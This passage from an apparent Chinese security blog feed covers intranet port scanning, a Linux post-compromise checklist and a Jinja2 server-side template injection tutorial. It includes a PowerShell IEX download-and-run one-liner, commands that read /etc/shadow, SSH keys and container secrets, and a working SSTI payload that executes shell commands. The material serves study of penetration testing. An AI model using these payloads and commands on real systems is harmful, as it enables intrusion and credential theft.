class="hljs-keyword">return</span> <span class="hljs-variable">$scannedHostList</span><br><br>        &#125;<br>        <span class="hljs-keyword">Catch</span><br>        &#123;<br>            <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>无文件落地</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;<br></code></pre></td></tr></table></figure><ul><li>有文件落地</li></ul><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#x27;445,1433,80,8080,3389&#x27;&quot;<br></code></pre></td></tr></table></figure></blockquote><h3 id="Telnet-1"><a href="#Telnet-1" class="headerlink" title="Telnet"></a>Telnet</h3><blockquote><p>telnet DC 22</p></blockquote><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><blockquote><p>search portscan</p><p>use anxiliary/scanner/portscan/tcp</p></blockquote><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><blockquote><p>nc.exe -vv 192.168.7.7 3389</p><p>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535</p><p>-r 随机指定本地与远端主机的通信端口<br>-z 使用 0 输入/输出模式，只在扫描通信端口时使用<br>-w&lt;超时秒数&gt; 设置等待连线的时间</p></blockquote><h3 id="fscan-1"><a href="#fscan-1" class="headerlink" title="fscan"></a>fscan</h3><h3 id="scanline-1"><a href="#scanline-1" class="headerlink" title="scanline"></a>scanline</h3><p>见上</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>linux 有域控的概念吗 我的看法是没有 但是可以配置对应的功能，或者加入域，这些是可以实现的</p><p>下面是一些在 linux 内网的信息收集</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><ul><li><ul><li><p>版本信息</p><p><code>uname -a</code> 所有版本 <code>uname -r</code> 内核版本信息 <code>uname -n</code> 系统主机名字 <code>uname -m</code> Linux 内核架构</p></li></ul></li><li><p>内核信息 <code>cat /proc/version</code></p></li><li><p>CPU 信息 <code>cat /proc/cpuinfo</code></p></li><li><ul><li><p>发布信息</p><p><code>cat /etc/*-release</code> <code>cat /etc/issue</code></p></li></ul></li><li><p>主机名 <code>hostname</code></p></li><li><p>文件系统 <code>df -a</code></p></li><li><p>内核日志 <code>dmesg</code> / <code>/var/log/dmesg</code></p></li></ul><h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul><li><p>列出系统所有用户 <code>cat /etc/passwd</code></p></li><li><p>列出系统所有组 <code>cat /etc/group</code></p></li><li><p>列出所有用户 hash（root）<code>cat /etc/shadow</code></p></li><li><ul><li><p>用户</p><p>查询用户的基本信息 <code>finger</code> 当前登录的用户 <code>users</code> <code>who -a</code> <code>/var/log/utmp</code> 查询无密码用户 <code>grep &#39;x:0:&#39; /etc/passwd</code></p></li></ul></li><li><p>目前登录的用户 <code>w</code></p></li><li><p>登入过的用户信息 <code>last</code> / <code>/var/log/wtmp</code></p></li><li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> / <code>/var/log/lastlog</code></p></li><li><p>登录成功日志 <code>/var/log/secure</code></p></li><li><p>登录失败日志 <code>/var/log/faillog</code></p></li><li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p></li><li><p>查看 passwd 最后修改时间 <code>ls -l /etc/passwd</code></p></li><li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p></li><li><ul><li><p>查看具有 sudo 权限的用户</p><p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p></li></ul></li></ul><h3 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息"></a>用户和权限信息</h3><ul><li>当前用户 <code>whoami</code></li><li>当前用户信息 <code>id</code></li><li>可以使用 sudo 提升到 root 的用户（root） <code>cat /etc/sudoers</code></li><li>列出目前用户可执行与无法执行的指令 <code>sudo -l</code></li></ul><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul><li>打印系统环境信息 <code>env</code></li><li>打印系统环境信息 <code>set</code></li><li>环境变量中的路径信息 <code>echo $PATH</code></li><li>打印历史命令 <code>history</code> / <code>~/.bash_history</code></li><li>显示当前路径 <code>pwd</code></li><li>显示默认系统遍历 <code>cat /etc/profile</code></li><li>显示可用的 shell <code>cat /etc/shells</code></li></ul><h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul><li>查看进程信息 <code>ps aux</code></li><li>资源占有情况 <code>top -c</code></li><li>查看进程关联文件 <code>lsof -c $PID</code></li><li>完整命令行信息 <code>/proc/$PID/cmdline</code></li><li>进程的命令名 <code>/proc/$PID/comm</code></li><li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li><li>运行程序的符号链接 <code>/proc/$PID/exe</code></li><li>进程的环境变量 <code>/proc/$PID/environ</code></li><li>进程打开文件的情况 <code>/proc/$PID/fd</code></li></ul><h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><ul><li>由 inetd 管理的服务列表 <code>cat /etc/inetd.conf</code></li><li>由 xinetd 管理的服务列表 <code>cat /etc/xinetd.conf</code></li><li>nfs 服务器的配置 <code>cat /etc/exports</code></li><li>邮件信息 <code>/var/log/mailog</code></li><li>ssh 配置 <code>sshd_config</code></li></ul><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>显示指定用户的计划作业（root） <code>crontab -l -u %user%</code></p><ul><li><ul><li><p>计划任务</p><p><code>/var/spool/cron/*</code> <code>/var/spool/anacron/*</code> <code>/etc/crontab</code> <code>/etc/anacrontab</code> <code>/etc/cron.*</code> <code>/etc/anacrontab</code></p></li></ul></li><li><ul><li><p>开机启动项</p><p><code>/etc/rc.d/init.d/</code></p></li></ul></li></ul><h3 id="网络、路由和通信"><a href="#网络、路由和通信" class="headerlink" title="网络、路由和通信"></a>网络、路由和通信</h3><ul><li>列出网络接口信息 <code>/sbin/ifconfig -a</code> / <code>ip addr show</code></li><li>列出网络接口信息 <code>cat /etc/network/interfaces</code></li><li>查看系统 arp 表 <code>arp -a</code></li><li>打印路由信息 <code>route</code> / <code>ip ro show</code></li><li>查看 dns 配置信息 <code>cat /etc/resolv.conf</code></li><li>打印本地端口开放信息 <code>netstat -an</code></li><li>列出 iptable 的配置规则 <code>iptables -L</code></li><li>查看端口服务映射 <code>cat /etc/services</code></li><li>Hostname <code>hostname -f</code></li><li>查看进程端口情况 <code>netstat -anltp | grep $PID</code></li></ul><h3 id="已安装程序"><a href="#已安装程序" class="headerlink" title="已安装程序"></a>已安装程序</h3><ul><li><code>rpm -qa --last</code> Redhat</li><li><code>yum list | grep installed</code> CentOS</li><li><code>ls -l /etc/yum.repos.d/</code></li><li><code>dpkg -l</code> Debian</li><li><code>cat /etc/apt/sources.list</code> Debian APT</li><li><code>pkg_info</code> xBSD</li><li><code>pkginfo</code> Solaris</li><li><code>pacman -Q</code> Arch Linux</li><li><code>emerge</code> Gentoo</li></ul><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><ul><li>最近五天的文件 <code>find / -ctime +1 -ctime -5</code></li><li>文件系统细节 <code>debugfs</code></li></ul><h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul><li><code>~/.ssh</code></li><li><code>/etc/ssh</code></li></ul><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><ul><li><code>/var/log/boot.log</code></li><li><code>/var/log/cron</code></li><li><code>/var/log/faillog</code></li><li><code>/var/log/lastlog</code></li><li><code>/var/log/messages</code></li><li><code>/var/log/secure</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/syslog</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/log/wtmp</code></li><li><code>/var/run/utmp</code></li></ul><h3 id="虚拟环境检测"><a href="#虚拟环境检测" class="headerlink" title="虚拟环境检测"></a>虚拟环境检测</h3><ul><li><code>lsmod | grep -i &quot;vboxsf\|vboxguest&quot;</code></li><li><code>lsmod | grep -i &quot;vmw_baloon\|vmxnet&quot;</code></li><li><code>lsmod | grep -i &quot;xen-vbd\|xen-vnif&quot;</code></li><li><code>lsmod | grep -i &quot;virtio_pci\|virtio_net&quot;</code></li><li><code>lsmod | grep -i &quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</code></li></ul><h3 id="容器内信息收集"><a href="#容器内信息收集" class="headerlink" title="容器内信息收集"></a>容器内信息收集</h3><ul><li><code>capsh --print</code></li><li><code>cat /proc/1/cgroup</code></li><li><code>env | grep KUBE</code></li><li><code>ls -l .dockerenv</code></li><li><code>ls -l /run/secrets/Kubernetes.io/</code></li><li><code>mount</code></li><li><code>ps aux</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti</title>
    <link href="/2022/01/02/SSTI/"/>
    <url>/2022/01/02/SSTI/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="SSTI-服务端模板注入漏洞"><a href="#SSTI-服务端模板注入漏洞" class="headerlink" title="SSTI-服务端模板注入漏洞"></a>SSTI-服务端模板注入漏洞</h2><p>服务端模板注入是由于服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><h3 id="Flask-Jinja2-服务端模板注入"><a href="#Flask-Jinja2-服务端模板注入" class="headerlink" title="Flask(Jinja2)服务端模板注入"></a><strong>Flask(Jinja2)服务端模板注入</strong></h3><p>Jinja2 是用于 Python 的全功能模板引擎。它具有完整的 unicode 支持，一个可选的集成沙盒执行环境，已被广泛使用并获得 BSD 许可。 Jinja2 由 Django 或 Flask 之类的 Python Web 框架使用。</p><p>Jinja 官方网站：</p><p><a href="https://jinja.palletsprojects.com/en/2.11.x/">https://jinja.palletsprojects.com/en/2.11.x/</a></p><ul><li>注入测试</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Georg&#x27;</span>)<br>    t = Template(<span class="hljs-string">&quot;Hello &quot;</span> + name)<br>    <span class="hljs-keyword">return</span> t.render()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,port=<span class="hljs-string">&#x27;80&#x27;</span>)<br></code></pre></td></tr></table></figure><p>详细的 payload 分析和 nodejs 的原型链有点相似，下面分析一个 payload：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%for c in [].__class__.__base__.__subclasses__()%&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>        &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br>    &#123;%endif%&#125;<br>&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><p><strong>__class__</strong> ，是类的内置属性，可以用来引用类</p><p><strong>__base__</strong> ，返回类的基类</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__</span><br>&lt;class &#x27;list&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; _</span><br>&lt;class &#x27;list&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; _.__mro__</span><br>(&lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__base__</span><br>&lt;class &#x27;object&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__bases__</span><br>(&lt;class &#x27;object&#x27;&gt;,)<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__mro__[1]</span><br>&lt;class &#x27;object&#x27;&gt;<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>可见<strong>__bases__，__mro__<strong>与</strong>__base__<strong>不同，我们需要拿到</strong>&lt;class ‘object’&gt;<strong>，当然也可以</strong>__mro__[1]<strong>来获得</strong>&lt;class ‘object’&gt;<strong>，下面都使用<strong><strong>base</strong></strong>来获取</strong>&lt;class ‘object’&gt;</strong></p><p><strong>__subclasses__</strong> ，每个类会保存它直接子类的弱引用组成的列表，此方法返回在这个类中直接子类引用组成的列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; [].__class__.__base__.__subclasses__()</span><br>[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;nt.ScandirIterator&#x27;&gt;, &lt;class &#x27;nt.DirEntry&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;PyHKEY&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;MultibyteCodec&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalEncoder&#x27;&gt;, &lt;class &#x27;MultibyteIncrementalDecoder&#x27;&gt;, &lt;class &#x27;MultibyteStreamReader&#x27;&gt;, &lt;class &#x27;MultibyteStreamWriter&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;os._AddedDllDirectory&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;]<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>所以当拿到 <strong>&lt;class ‘object’&gt;</strong> 时，就可以返回 Object 类的子类列表</p><p>进一步地，我们找到我们能够利用的子类(能执行命令或者可以读取文件的类就可以了，重点关注 os/file 这些关键字，使用 init.globals 来看看有没有 os module 或者其他的可以读写文件的)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[<span class="hljs-number">7</span>].__name__<br><span class="hljs-string">&#x27;list&#x27;</span><br>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[<span class="hljs-number">7</span>].__init__<br>&lt;slot <span class="hljs-keyword">wrapper</span> <span class="hljs-string">&#x27;__init__&#x27;</span> <span class="hljs-keyword">of</span> <span class="hljs-string">&#x27;list&#x27;</span> objects&gt;<br></code></pre></td></tr></table></figure><p>获得 Object 的子类 list，初始化 init 报了一个 wrapper，是指这些函数没有被重载，这时弹并不是 function，不具有<strong>__globals__</strong> 属性</p><p>现在使用上面的测试代码找一个具有<strong>__globals__</strong> 属性的函数</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102211933255.png"></p><p>os 找到下面的这个</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102212006476.png"></p><p>但是并不是 os，也没有发现 popen 函数，所以利用失败</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102220047260.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102220222810.png"></p><p>但是有<strong>__builtins__</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102220723509.png"></p><p><a href="https://blog.csdn.net/lu8000/article/details/44217499/">https://blog.csdn.net/lu8000/article/details/44217499/</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102212658133.png"></p><p>当然不了解这个类的话，可以换，随便找了一个，再次搜看有没有 popen 函数</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102221055005.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102221116811.png"></p><p>利用</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220102221305536.png"></p><p>再介绍几个，如果存在的话可以不进行爆破， <strong>catch_warnings（有 eval），_Printer 和&lt;class ‘os._wrap_close’&gt;（这两个有 popen）</strong></p><p>然后像 sqlmap 一样，这个也有检测的脚本<a href="https://github.com/epinna/tplmap">tplmap</a></p><p>还有一些几个寻找子类的脚本备用</p><ul><li>万能利用</li></ul><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;%for c in [].__class__.__base__.__subclasses__()%&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;<br>        &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br>    &#123;%endif%&#125;<br>&#123;%endfor%&#125;<br></code></pre></td></tr></table></figure><ul><li>本地寻找本地的类脚本，适合源码题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">search = <span class="hljs-string">&#x27;popen&#x27;</span><br>num = -<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__():<br>    num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">in</span> i.__init__.__globals__.keys():<br>            <span class="hljs-built_in">print</span>(i,num)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li>寻找题目中类的脚本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>a = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;class &#x27;type&#x27;&gt;,...,&lt;class &#x27;subprocess.Popen&#x27;&gt; # 所有子类</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>num = <span class="hljs-number">0</span><br>allList = []<br><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&gt;&quot;</span>:<br>        result += i<br>        allList.append(result)<br>        result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&quot;\n&quot;</span> <span class="hljs-keyword">or</span> i == <span class="hljs-string">&quot;,&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        result += i<br><br><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(allList):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;os._wrap_close&quot;</span> <span class="hljs-keyword">in</span> v:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(k)+<span class="hljs-string">&quot;---&gt;&quot;</span>+v)<br></code></pre></td></tr></table></figure><p>还可以使用 url 请求的方式去跑</p><figure class="highlight python"><table><tr><td 